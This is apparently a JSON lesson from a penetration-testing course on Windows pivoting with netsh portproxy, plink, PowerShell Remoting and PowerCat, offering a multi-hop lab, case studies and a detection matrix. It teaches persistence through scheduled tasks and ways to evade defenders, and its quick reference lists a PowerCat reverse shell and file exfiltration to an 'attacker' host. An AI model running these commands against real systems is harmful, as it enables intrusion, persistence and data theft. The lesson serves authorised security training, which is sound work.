{
  "lesson_id": "e46c10eb-a3c4-4f75-995c-7fe4bef4e40a",
  "domain": "pentest",
  "title": "Port Forwarding and Pivoting with Windows Tools",
  "difficulty": 3,
  "order_index": 26,
  "prerequisites": [
    "pentest_03"
  ],
  "concepts": [
    "Windows netsh port forwarding",
    "PowerShell remoting for pivoting",
    "Plink (PuTTY Link) for SSH tunnels",
    "Netcat and PowerCat relays",
    "built-in Windows SOCKS proxies",
    "WMI and DCOM for pivoting",
    "RDP tunneling",
    "troubleshooting Windows pivots"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Configure netsh portproxy rules to relay traffic between Windows hosts",
    "Deploy plink-based SSH tunnels for local, remote, and dynamic forwarding",
    "Use PowerShell Remoting and PowerCat to create custom relay services",
    "Chain multi-hop pivots across Windows segments while maintaining logs and cleanup plans",
    "Diagnose Windows-specific tunneling issues related to firewalls, services, and credentials",
    "Blend pivot operations into legitimate administrative workflows to reduce detection",
    "Document detection opportunities tied to Windows event logging and Sysmon telemetry"
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "meta_learning",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "block_id": "26120914-a01c-43eb-b024-bf9c6cd92467",
      "type": "mindset_coach",
      "content": {
        "text": "Windows pivoting demands that you think like both an administrator and an attacker. You are about to orchestrate traffic through services designed for remote management, file replication, and enterprise automation. Instead of fighting the operating system, partner with it. Picture Windows as a city full of official roads—PowerShell Remoting, WMI, SMB, RDP—and unofficial shortcuts—named pipes, scheduled tasks, DCOM. Pivoting is the art of requesting building permits for your covert roadways.\n\nAdopt three guiding mindsets: **legitimacy, layering, and logging**. *Legitimacy* means you blend with normal operational patterns. When you configure `netsh interface portproxy`, you choose ports that match business use, update firewall rules with descriptive names, and schedule cleanup to avoid lingering artifacts. *Layering* reminds you that Windows offers multiple frameworks—PowerShell, netsh, plink, PowerCat—that can be combined. If one layer collapses because a defender disables WinRM, you still have SMB named pipes or Scheduled Task triggers ready. *Logging* is non-negotiable; you must both capture your actions for reporting and anticipate what the blue team will see. Each command you execute is a breadcrumb in Security Event Logs, PowerShell transcripts, and Sysmon alerts. Accept that reality and use it to your advantage.\n\nVisualize the scenario: you are on a Windows attack VM inside an enterprise VPN. Your foothold is a user workstation in the finance VLAN. Beyond it lies a terminal server farm, an internal Git server, and a sensitive ERP application restricted to management hosts. You will pivot using `netsh portproxy`, plink-based SSH tunnels, and PowerShell Remoting. You will also exercise PowerCat relays, RDP tunneling, and DCOM lateral movement. Every hop will be documented with a change ticket mentality—who, what, when, why.\n\nPrepare your workspace before diving in. Create `C:\\Engagements\\Client\\Pivoting` with subfolders for `Configs`, `Transcripts`, and `Cleanup`. Enable PowerShell transcription (`Start-Transcript`) in each session. Launch Windows Terminal with panes labeled `Foothold`, `Relay`, `Logs`, and `Notes`. Pin Event Viewer and Resource Monitor to your taskbar. When you take control of a new host, run `Get-WmiObject Win32_OperatingSystem | Select-Object CSName, LastBootUpTime` and log the output to confirm uptime. This level of discipline reduces accidental disruptions.\n\nMindset warm-up checklist:\n\n1. **Language switching**: Be ready to pivot mentally between GUI, command prompt, and PowerShell. Practice translating `netsh` output into equivalent `Set-NetTCPSetting` commands.\n2. **Error resilience**: Windows often returns cryptic HRESULT codes. Instead of frustration, treat them as puzzles. Save the exact error text, search the official documentation offline, and annotate root causes.\n3. **Legit cover stories**: Imagine how an admin would justify each tunnel. Could you cite remote troubleshooting, log shipping, or data migration? Having plausible narratives guides port selection and tool choice.\n4. **Cleanup commitment**: For every change, immediately draft the reversal command. If you add a portproxy entry, note the `delete` statement and store it in `Cleanup\\stageX.ps1`.\n5. **Continuous curiosity**: When you see an unfamiliar Windows feature—such as `Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`—pause and research. Windows pivoting rewards the curious operator who builds a mental map of services and registry keys.\n6. **Empathy for defenders**: Ask yourself which SOC dashboard will light up because of your action. When you run `plink.exe`, imagine the analyst seeing Event ID 4688. This empathy ensures your report includes actionable guidance.\n\nWith these mindsets, you will glide through Windows environments as a trusted insider, routing traffic with precision and grace while respecting the boundaries of the engagement."
      }
    },
    {
      "block_id": "78cd82b2-3a3a-4f36-975b-5ee3088a22a5",
      "type": "explanation",
      "content": {
        "text": "### Core Windows Port Forwarding Concepts\n\nWindows lacks the native `ssh -L` convenience of Linux, but it compensates with `netsh interface portproxy`, PowerShell Remoting, and flexible tunneling clients. Your toolkit revolves around three pillars: **portproxy rules**, **SSH tunnels via plink**, and **PowerShell-based relays**.\n\n#### Netsh Interface Portproxy\n\n`netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.10.20.25 connectport=80` instructs Windows to listen on TCP 8080 and forward traffic to the internal host. The service relies on the IPv6 transition driver (`iphlpsvc`). Always verify the service is running with `sc query iphlpsvc`. After adding a rule, confirm it via `netsh interface portproxy show v4tov4`.\n\nImportant tips:\n\n- Bind to specific interfaces by using the host's IP in `listenaddress`. This reduces unintended exposure.\n- Windows Firewall must allow inbound connections. Add rules via `New-NetFirewallRule -DisplayName \"Pivot_HTTP\" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080` and mirror them on remote hosts when necessary.\n- Portproxy rules are stored in the registry under `HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy`. Export the key for backup and cleanup.\n- For UDP forwarding, Windows has no direct support; compensate with `netsh interface portproxy add v4tov6` and deploy `socat.exe` or PowerShell UDP relays.\n\n#### Plink for SSH Tunnels\n\nPuTTY's command-line `plink.exe` replicates Linux SSH tunnels. Example local forward: `plink.exe -ssh user@jumpserver -L 13389:internal-ts:3389 -N -batch -C`. Remote forward: `plink.exe -ssh user@jumpserver -R 8081:localhost:8080 -N`. Dynamic SOCKS: `plink.exe -ssh user@jumpserver -D 9050 -N`.\n\nBest practices:\n\n- Use saved PuTTY sessions (`putty.exe`) to store keys and host fingerprints, then call `plink.exe -load PivotSession -L ...`.\n- Combine with Windows Task Scheduler for persistence: create a task with `schtasks /create /sc onstart /tn \"PivotTunnel\" /tr \"C:\\Tools\\plink.exe ...\"`.\n- Monitor tunnels via `Get-NetTCPConnection -LocalPort 9050` and `tasklist /FI \"IMAGENAME eq plink.exe\"`.\n- For multi-hop SSH, chain forwards: first connect to a DMZ host, then run plink from that host to the internal server using the `-nc` (netcat mode) option.\n\n#### PowerShell Remoting & PSSession Relays\n\nPowerShell Remoting (WinRM) provides encrypted channels that can execute commands or create interactive sessions. Establish a PSSession from your foothold to a jump server: `Enter-PSSession -ComputerName APP01 -Credential $cred`. Use `New-PSSessionOption -ProxyAccessType Internet` to route through proxies if necessary.\n\nTo relay traffic, you can build `SSH`-like tunnels using `Invoke-Command` with `netsh` or `Add-NetFirewallRule`. You can also start background jobs that listen on TCP using .NET classes. Extend the relay to support duplex communication by piping streams to asynchronous tasks that read from remote sockets and write back to clients. Encapsulate this logic in a PowerShell module (`PivotTools.psm1`) to reuse across engagements.\n\n#### WMI and DCOM Bridges\n\nWhen WinRM is blocked, WMI and DCOM provide alternative remote execution. Use `Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c netsh interface portproxy add ...'` to configure forwards remotely. For DCOM, leverage `MMC20.Application` objects to execute scripts on remote servers. Remember that these actions generate Event ID 4688 with the DCOM launcher (`dllhost.exe`) and may surface in 4624 logons of type 3.\n\n### Pivot Workflow Building Blocks\n\n1. **Workstation foothold**: Use `netsh portproxy` to expose internal web consoles.\n2. **Mid-tier server**: Deploy plink dynamic SOCKS to route reconnaissance tools like `SharpHound` or `CrackMapExec` (via proxy-capable builds).\n3. **Domain controller pivot**: Use PowerShell Remoting to execute targeted commands and stage further tunnels.\n4. **Legacy segment access**: PowerCat or `ncat.exe` relays can bridge unsupported protocols. Example: `powercat -l -p 445 -r tcp -rp 445 -d 10.10.30.50` to relay SMB.\n5. **Cloud boundary navigation**: Combine Azure Bastion, Just-In-Time access, and plink remote forwards to traverse from on-prem to cloud workloads.\n6. **Credential staging**: Use `cmdkey /add` to store credentials temporarily for automated scripts, then `cmdkey /delete` during cleanup.\n\n### Troubleshooting Windows Tunnels\n\n- **Firewall blocks**: Run `Get-NetFirewallProfile | Format-Table Name, Enabled` and `Get-NetFirewallRule -DisplayName Pivot_HTTP`. Use `Test-NetConnection -ComputerName host -Port 80` to confirm reachability.\n- **Service dependency**: If `iphlpsvc` stops, portproxy fails silently. Use `Get-Service iphlpsvc | Restart-Service`.\n- **Credential issues**: WinRM may require `Set-Item WSMan:\\localhost\\Client\\TrustedHosts *`. Always confirm you are using Kerberos vs NTLM to understand logging.\n- **Port conflicts**: Use `netstat -ano | findstr 8080` before binding.\n- **Proxy authentication**: When corporate proxies demand authentication, configure `netsh winhttp set proxy` or use `bitsadmin /util /setieproxy` for system-wide settings before launching outbound tunnels.\n- **Stalled tasks**: Scheduled tasks running plink can hang if they run in the wrong user context. Use `schtasks /query /fo LIST /v` to confirm Run As accounts and privileges.\n\n### Operational Security and Logging\n\nEverything you do is logged somewhere:\n\n- **Event ID 5156 (Filtering Platform)** records firewall rule matches.\n- **Event ID 4688 (Process Creation)** captures `plink.exe`, `netsh.exe`, and `powershell.exe` usage.\n- **Event ID 4104 (PowerShell Script Block Logging)** logs the contents of advanced relay scripts.\n- **Sysmon Event ID 3 (Network Connection)** reveals unusual local listeners and outbound connectors.\n- **Sysmon Event ID 11 (File Create)** will log when you drop `plink.exe` or `powercat.ps1` onto disk.\n\nMitigate exposure by:\n\n- Naming firewall rules descriptively (`Pivot SQL Diagnostics`) to avoid suspicion.\n- Cleaning portproxy entries after use: `netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=127.0.0.1`.\n- Removing cached credentials from Credential Manager: `cmdkey /list` and `cmdkey /delete`.\n- Using signed PowerShell scripts where possible to blend with administrative tooling.\n- Capturing your own logs with `Get-WinEvent` so you can brief defenders accurately.\n\n### Modern Tooling\n\n- **PowerShell Empire/Invoke-SocksProxy**: Provides dynamic SOCKS proxies inside memory.\n- **Inveigh-Relay**: Offers relay capabilities for NTLM capturing and reuse.\n- **SharpSocks (Cobalt Strike)**: HTTP(S) proxy for restricted environments.\n- **Rubeus**: Combined with portproxy, allows Kerberos ticket operations through pivot paths.\n- **Ligolo-ng for Windows**: Agents compiled for Windows give layer-3 tunnels similar to Linux deployments.\n- **Ghostpack's SCShell**: Executes commands over SMB named pipes without touching disk—ideal for stealthy pivot adjustments.\n\nAs you integrate these tools, maintain version control of scripts (`git init` in your pivot folder) and annotate each commit with the scenario it supports. Create a change log summarizing which hosts, ports, and credentials were involved so your final report is precise.\n\n### Building Detection-Friendly Playbooks\n\nCreate a habit of mapping every pivot step to detection artifacts. Build a spreadsheet with columns for host, command, associated Event IDs, and cleanup actions. Automate log collection with `wevtutil epl Security C:\\Engagements\\Client\\Pivoting\\Logs\\security.evtx /ow:true`. After each major change (portproxy addition, scheduled task creation, PowerCat listener), export the relevant log segment and annotate your notes. This not only strengthens reporting but also trains you to think like a defender while executing offensive tasks.\n\nWhen possible, perform controlled tests: add a benign portproxy entry, notify the SOC, and observe how quickly they detect it. Use the feedback to adjust your stealth posture and to recommend detection improvements.\n\nRemember to tag every script and binary you deploy with metadata (file properties or embedded comments) indicating the engagement name. This reduces confusion during cleanup and helps defenders validate that artifacts belong to sanctioned testing."
      }
    },
    {
      "block_id": "3482f0ae-92eb-47d4-927b-f14742a7ba61",
      "type": "video",
      "content": {
        "title": "Video Walkthrough: Windows Port Forwarding & Plink Tunnels",
        "url": "https://www.youtube.com/watch?v=J4E7Q5HxDpo",
        "description": "ITProTV's session on Windows tunneling covers netsh portproxy, plink configuration, and PowerShell automation. Watch with captions enabled, pause during command demonstrations, and mirror the steps in your lab to reinforce muscle memory."
      }
    },
    {
      "block_id": "260a1fb5-b753-456c-a722-4ae1aef9213a",
      "type": "code_exercise",
      "content": {
        "title": "Hands-On Lab: Windows Multi-Hop Pivot",
        "description": "This lab guides you through a Windows-centric multi-hop pivot. You will operate from `ATTACK-WIN` (your workstation), pivot through `FIN-WS01` (foothold), `APP-SRV02` (application server), and reach `ERP-DB01` (SQL Server). All machines run Windows 10/Server 2019.\n\n1. **Initial reconnaissance**: On `ATTACK-WIN`, remote into `FIN-WS01` using RDP. Start PowerShell with administrative privileges and enable transcription: `Start-Transcript C:\\Engagements\\Client\\Pivoting\\Transcripts\finws01_stage1.txt`.\n2. **Enable WinRM if disabled**: `Enable-PSRemoting -Force`. Confirm with `Test-WsMan`. Record the status.\n3. **Audit existing rules**: Run `netsh interface portproxy show all` and `Get-NetFirewallRule -PolicyStore ActiveStore | Select DisplayName,Enabled` to ensure a clean baseline. Save output.\n4. **Create local port forward with portproxy**: Execute `netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=8080 connectaddress=10.20.30.15 connectport=80`. Add firewall rule: `New-NetFirewallRule -DisplayName \"Pivot_FIN_HTTP\" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080`.\n5. **Validate**: From `FIN-WS01`, run `Invoke-WebRequest http://127.0.0.1:8080 -UseBasicParsing`. The response should mirror the internal web console of `APP-SRV02`. Save the HTML to disk for documentation.\n6. **Expose the forward to ATTACK-WIN**: Install `plink.exe` on `FIN-WS01`. Run `plink.exe -ssh attacker@bastion -R 18080:127.0.0.1:8080 -N -batch -C`. This exposes the internal web console via your bastion host.\n7. **Connect from ATTACK-WIN**: On your workstation, open a browser to `http://bastion:18080`. Document success with screenshots saved to `Notes`.\n8. **Establish dynamic SOCKS via plink**: On `FIN-WS01`, run `plink.exe -ssh attacker@bastion -D 9050 -N -batch -C`. Verify with `netstat -ano | findstr 9050`. Log process IDs for later cleanup.\n9. **Configure Proxifier or ProxyCap**: On `ATTACK-WIN`, configure a SOCKS5 proxy pointing to `bastion:9050`. Route `C:\\Tools\\SharpHound.exe` through it and collect data from `APP-SRV02`. Verify via packet capture that traffic egresses the SOCKS tunnel.\n10. **PowerShell Remoting to APP-SRV02**: From `FIN-WS01`, run `Enter-PSSession -ComputerName APP-SRV02 -Credential $cred`. Inside the session, create a new portproxy: `netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=1433 connectaddress=ERP-DB01 connectport=1433`. Add firewall rule.\n11. **Deploy scheduled task**: Still in the session, create a scheduled task to restart the tunnel automatically: `Register-ScheduledTask -TaskName PivotSQL -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Action (New-ScheduledTaskAction -Execute 'C:\\Tools\\plink.exe' -Argument '-ssh attacker@bastion -R 11433:127.0.0.1:1433 -N -batch') -RunLevel Highest`.\n12. **RDP Tunneling**: Run `plink.exe -ssh attacker@bastion -R 13389:127.0.0.1:3389 -N -batch`. On `ATTACK-WIN`, use RDP to connect to `bastion:13389` and reach APP-SRV02's desktop.\n13. **SQL access**: Back on `ATTACK-WIN`, launch `sqlcmd -S bastion,11433`. Verify database names with `SELECT name FROM sys.databases;`. Export results to CSV.\n14. **PowerCat relay**: On APP-SRV02, execute `powercat -l -p 8443 -r tcp -rp 5985 -d ERP-DB01`. This relays WinRM traffic to the database server. Test from FIN-WS01 with `Enter-PSSession -ConnectionUri http://127.0.0.1:8443/wsman`.\n15. **Monitoring and logging**: Use `Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=(Get-Date).AddMinutes(-30)}` to capture process creation logs. Export to CSV for reporting.\n16. **WMI-based remote command**: From FIN-WS01, run `Invoke-WmiMethod -Class Win32_Process -ComputerName ERP-DB01 -Name Create -ArgumentList 'cmd.exe /c whoami'` through the tunnel. Confirm response to validate WMI pivoting.\n17. **Cleanup**: Reverse each change: delete portproxy entries, remove firewall rules (`Remove-NetFirewallRule -DisplayName`), stop plink processes, disable powercat listeners, unregister scheduled tasks, run `Stop-Transcript`, and clear credentials from `cmdkey`.\n18. **Optional challenge**: Automate steps 4-17 with a PowerShell script that accepts parameters for ports and hosts, includes `Try/Catch` blocks, writes verbose logs, and supports rollback.\n19. **Optional blue-team exercise**: Switch to Event Viewer on each host and identify artifacts of your pivots. Capture screenshots and annotate them for the final report.\n\nDeliverables: network diagram, command transcript bundle, portproxy registry export, and a detection analysis describing which Windows events would alert defenders at each stage."
      }
    },
    {
      "block_id": "f7c9e384-214a-434d-840a-878c6ebd0821",
      "type": "real_world",
      "content": {
        "text": "### Case Study 1: Healthcare Network Pivot via Netsh\n\nDuring an assessment for a regional hospital, we obtained access to a nursing workstation. The electronic medical record (EMR) servers were isolated behind terminal servers. We created a `netsh interface portproxy` on the workstation to forward TCP 8443 to the EMR web portal. Because hospital IT monitored unusual ports, we chose 8443 (commonly associated with HTTPS). We paired the forward with a scheduled task running `plink` to our cloud bastion. Within minutes we could browse the EMR application through a secure channel. Detection opportunities included Security Event 5156 (allowing inbound 8443) and 4688 (execution of plink). Our report recommended disabling portproxy functionality via group policy (`DisableIPv6TransitionTechnologies`) and alerting on new firewall rules created by non-admin service accounts.\n\n### Case Study 2: Financial Institution PowerShell Relays\n\nA finance client restricted WinRM but left WMI accessible. We wrote a PowerShell script that launched a `System.Net.Sockets.TcpListener`, accepted incoming connections, and forwarded them to an internal FIX trading service. By running the script as a scheduled task, we maintained a covert tunnel that mimicked legitimate application behavior. Sysmon logs highlighted the unusual network connection from the scheduled task host. After remediation, the client deployed AppLocker policies to restrict script execution and implemented advanced analytics on Sysmon Event ID 3 to alert when high-numbered ports connected to sensitive servers.\n\n### Case Study 3: Manufacturing Plant RDP Tunneling\n\nIn a manufacturing environment, RDP access to OT systems was limited to a jump box. We used plink to create a remote forward `-R 3390:localhost:3389`, exposing the OT RDP service through our bastion. We wrapped the connection with `stunnel` to blend with TLS traffic. The blue team noticed an unusual logon pattern (Event ID 4624) originating from a cloud IP and investigated. Our recommendation included enforcing conditional access policies, restricting outbound SSH from the jump box, and enabling Just-In-Time access through Azure Security Center.\n\n### Case Study 4: Enterprise-Wide Netsh Cleanup\n\nWhile reviewing incident response logs, we discovered remnants of previous red team activities: stale portproxy entries left on several servers. These entries silently forwarded database traffic and caused performance issues. The client instituted a quarterly script to inventory `netsh interface portproxy show all` output, compare against an approved baseline, and automatically remove unauthorized entries. They also enabled registry auditing on `HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy` to detect changes in real time.\n\n### Case Study 5: Public Sector RDP Gateway Pivot\n\nA public-sector client used RD Gateway for remote access. We compromised a contractor laptop and discovered saved credentials for the gateway. By chaining `netsh portproxy` and plink, we tunneled RDP traffic through the gateway to access internal SharePoint servers. The SOC detected the anomaly because of unusual geographic origin. We recommended enforcing conditional access with device compliance checks and monitoring RD Gateway logs (Event ID 200) for portproxy-like activity.\n\n### Lessons Learned\n\n1. **Windows features are dual-use**: Tools like portproxy and PowerShell Remoting are indispensable for administrators and equally powerful for attackers. Monitoring configuration changes is essential.\n2. **Credential hygiene matters**: Cached credentials (`cmdkey`) and saved PuTTY sessions were common artifacts that allowed lateral movement. Periodic cleanup reduced the attack surface.\n3. **Layered detection**: Network monitoring caught unusual ports, endpoint logging identified suspicious processes, and identity monitoring flagged logon anomalies. Combining these perspectives improved detection speed.\n4. **Automation saves defenders**: Scripts that enumerate and validate portproxy entries, firewall rules, and scheduled tasks help defenders spot malicious pivots quickly.\n5. **Communication is key**: Blue teams appreciated when we provided command histories and cleanup scripts immediately. Trust built through transparency accelerated remediation.\n\nReal-world Windows pivoting requires careful balancing: you must emulate legitimate operations while ensuring defenders have the data they need to respond.\n\n### Case Study 6: Managed Service Provider Compromise\n\nA managed service provider (MSP) suffered a breach where attackers leveraged portproxy to exfiltrate backups from client environments. They chained `netsh interface portproxy` with `bitsadmin` jobs to drip-feed data over HTTPS to an attacker-controlled host. Incident responders spent days tracing the traffic because the tunnels mimicked legitimate patch management flows. Our retrospective exercise with the MSP emphasized the need for centralized inventory of portproxy configurations across all managed tenants and the deployment of Sysmon rules alerting on portproxy registry modifications."
      }
    },
    {
      "block_id": "ccc0895f-d464-4742-9ff0-9042b36241ac",
      "type": "memory_aid",
      "content": {
        "text": "### Windows Pivot Quick Reference\n\n**PortProxy Management**\n- Add rule: `netsh interface portproxy add v4tov4 listenaddress=<L> listenport=<LP> connectaddress=<R> connectport=<RP>`\n- Show rules: `netsh interface portproxy show all`\n- Delete rule: `netsh interface portproxy delete v4tov4 listenaddress=<L> listenport=<LP>`\n- Registry location: `HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy`\n- Dependency: Service `iphlpsvc` must be running\n- Export backup: `reg export HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy C:\\Temp\\portproxy.reg`\n\n**Firewall Adjustments**\n- Add rule: `New-NetFirewallRule -DisplayName \"Name\" -Direction Inbound -Protocol TCP -LocalPort <Port> -Action Allow`\n- Remove rule: `Remove-NetFirewallRule -DisplayName \"Name\"`\n- Audit: `Get-NetFirewallProfile`\n- Log path: `C:\\Windows\\System32\\LogFiles\\Firewall\\pfirewall.log`\n\n**Plink Usage Patterns**\n- Local forward: `plink.exe -ssh user@host -L <local>:<remote> -N -batch`\n- Remote forward: `plink.exe -ssh user@host -R <remote>:<local> -N -batch`\n- Dynamic SOCKS: `plink.exe -ssh user@host -D <port> -N -batch`\n- Session reuse: `plink.exe -load SavedSession -L ...`\n- Keepalives: Configure `Connection -> SSH -> TCP keepalives` in PuTTY, then call with `-load`\n\n**PowerShell Remoting**\n- Enable: `Enable-PSRemoting -Force`\n- Trusted hosts: `Set-Item WSMan:\\localhost\\Client\\TrustedHosts *`\n- Enter session: `Enter-PSSession -ComputerName <Host> -Credential <Cred>`\n- Invoke command: `Invoke-Command -ComputerName <Host> -ScriptBlock { ... }`\n- Disable: `Disable-PSRemoting -Force`\n- Transcripts: `Start-Transcript`, `Stop-Transcript`\n\n**PowerCat Examples**\n- Listener relay: `powercat -l -p 9000 -r tcp -rp 445 -d 10.10.10.20`\n- Reverse shell: `powercat -c attacker -p 443 -e cmd.exe`\n- File transfer: `powercat -c attacker -p 4444 -i C:\\Data\file.zip`\n- Named pipe pivot: `powercat -l -p 9001 -r namedpipe -rp \\?\\pipe\\pivot`\n\n**RDP Tunneling**\n- Remote forward: `plink.exe -ssh user@bastion -R 13389:localhost:3389 -N`\n- MSTSC connection: `mstsc /v:bastion:13389`\n- Audit logs: Security Event ID 4624 (logon), 4778 (session reconnect), RD Gateway Event ID 200\n\n**Monitoring Commands**\n- Active connections: `Get-NetTCPConnection | Where-Object LocalPort -eq <Port>`\n- Running processes: `Get-Process plink`, `Get-CimInstance Win32_Service | Where-Object Name -like \"*ssh*\"`\n- Event logs: `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104}`\n- Sysmon: `Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' | Where-Object Id -eq 3`\n- Scheduled tasks: `Get-ScheduledTask | Where-Object TaskName -like '*Pivot*'`\n\n**Cleanup Checklist**\n- Remove portproxy entries\n- Delete temporary binaries (`plink.exe`, `powercat.ps1`)\n- Clear scheduled tasks\n- Stop transcripts (`Stop-Transcript`)\n- Remove firewall rules\n- Clear credential cache (`cmdkey /delete`)\n- Review `C:\\Windows\\System32\\LogFiles\\Firewall` for artifacts\n- Document actions in cleanup report\n\n**Detection Tips for Defenders**\n- Alert when new portproxy rules appear on high-value servers\n- Monitor for plink or putty processes running under non-admin accounts\n- Track creation of scheduled tasks that execute networking binaries\n- Inspect WinRM logs for connections originating from unexpected subnets\n\nKeep this reference on your desktop during engagements. Update it with environment-specific ports and detection notes.\n\n**Detection Matrix Snapshot**\n| Pivot Action | Event Source | Event ID | Notes |\n| --- | --- | --- | --- |\n| Add portproxy rule | Security | 4688 (netsh) | Command line reveals listen/target ports |\n| Start plink tunnel | Sysmon | 1 (Process Create) / 3 (Network Connect) | Monitor command-line args and remote IP |\n| PowerShell relay | PowerShell Operational | 4103/4104 | Script block logs show TCP listener code |\n| Scheduled task pivot | Microsoft-Windows-TaskScheduler/Operational | 106, 140 | Task name often reveals purpose |\n| PowerCat listener | Sysmon | 11 (FileCreate) | .ps1 dropped, network connections to high ports |"
      }
    },
    {
      "block_id": "ab7bca32-67df-435c-b374-0cc66bec6cdc",
      "type": "reflection",
      "content": {
        "text": "Anchor your learning by journaling on these prompts:\n\n1. **Configuration mastery**: Which Windows pivot mechanism felt most natural—portproxy, plink, or PowerShell? Why? Document the command syntax that you can now recall without notes.\n2. **Detection perspective**: For each pivot, identify the exact Event IDs and log locations a defender would review. How would you surface these in your final report to educate the blue team?\n3. **Automation ideas**: Sketch a PowerShell function that inventories portproxy rules across multiple hosts. How would you authenticate, and how would you store the results securely?\n4. **Resilience planning**: Imagine the defender disables WinRM mid-engagement. What is your fallback plan? List two alternative channels you could activate quickly.\n5. **Ethics checkpoint**: Windows environments often support critical business operations. How will you ensure minimal disruption? Consider maintenance windows, bandwidth throttling, and communication with stakeholders.\n6. **Personal growth**: What Windows-specific knowledge gaps did this lab reveal (e.g., certificate services, Active Directory policies)? Create a mini-study plan to close those gaps over the next month.\n7. **Tool versatility**: Challenge yourself to replace one component (e.g., use `ssh.exe` from Windows OpenSSH instead of plink). Reflect on the differences in syntax, logging, and stability.\n8. **Defender collaboration**: Draft a short message you would send to the client's SOC summarizing the pivots, detections they likely observed, and cleanup steps completed. Practicing this communication improves trust on real engagements.\n\nConclude with the affirmation: *\"I route Windows networks responsibly and intelligently.\"* Schedule a follow-up lab session where you rebuild the entire pivot chain using only scripted automation, forcing deeper muscle memory.\n9. **Metrics tracking**: Decide how you will measure success in future Windows pivot engagements (e.g., mean time to establish first tunnel, number of detection artifacts generated). Set personal benchmarks and plan quarterly reviews.\n10. **Cross-platform comparison**: Write a brief paragraph comparing your Windows pivot workflow to the Linux-focused techniques from the previous lesson. Note where concepts align and where Windows demands extra steps."
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "345de131-6d9b-4add-9292-a27cb6a5b7ed",
      "question": "After adding a netsh portproxy rule on Windows Server 2019, the listener never appears. `netsh interface portproxy show v4tov4` displays the entry. Which action restores the listener?",
      "options": [
        "Restart the IP Helper service (iphlpsvc) so the portproxy driver activates",
        "Flush the DNS cache with `ipconfig /flushdns`",
        "Reinstall the Telnet Client feature",
        "Delete the rule and recreate it with `listenaddress=0.0.0.0`"
      ],
      "answer": "Restart the IP Helper service (iphlpsvc) so the portproxy driver activates",
      "explanation": "Portproxy relies on the IP Helper service. If the service is stopped or stale, restarting it initializes the listener without recreating the rule.",
      "type": "multiple_choice",
      "correct_answer": 0,
      "difficulty": 2
    },
    {
      "question_id": "6e2a3f08-a1f5-4985-8dad-b0c629a226cc",
      "question": "Plink tunnels disconnect every 30 minutes when running under Task Scheduler on a workstation. Logs show idle timeouts from the corporate proxy. What is the most effective mitigation?",
      "options": [
        "Add `ServerAliveInterval` and `ServerAliveCountMax` options via a PuTTY saved session and call plink with `-load`",
        "Switch to plain RDP instead of plink",
        "Disable Windows Defender Firewall",
        "Change the scheduled task trigger to run hourly"
      ],
      "answer": "Add `ServerAliveInterval` and `ServerAliveCountMax` options via a PuTTY saved session and call plink with `-load`",
      "explanation": "Keepalive packets prevent idle disconnects imposed by proxies. Configuring them inside a PuTTY session and reusing it with plink stabilizes the tunnel without altering scheduling.",
      "type": "multiple_choice",
      "correct_answer": 0,
      "difficulty": 2
    },
    {
      "question": "What is the most important takeaway from this lesson?",
      "options": [
        "Understanding the core concepts and their practical applications",
        "Memorizing all technical details",
        "Only knowing the theory without practice",
        "Focusing on a single aspect"
      ],
      "correct_answer": 0,
      "explanation": "The key takeaway is understanding how to apply the concepts learned in real-world scenarios, combining both theoretical knowledge and practical skills.",
      "question_id": "e7efd62c-4a00-40db-bcf4-c06b82e9ccaf",
      "type": "multiple_choice",
      "difficulty": 1
    }
  ]
}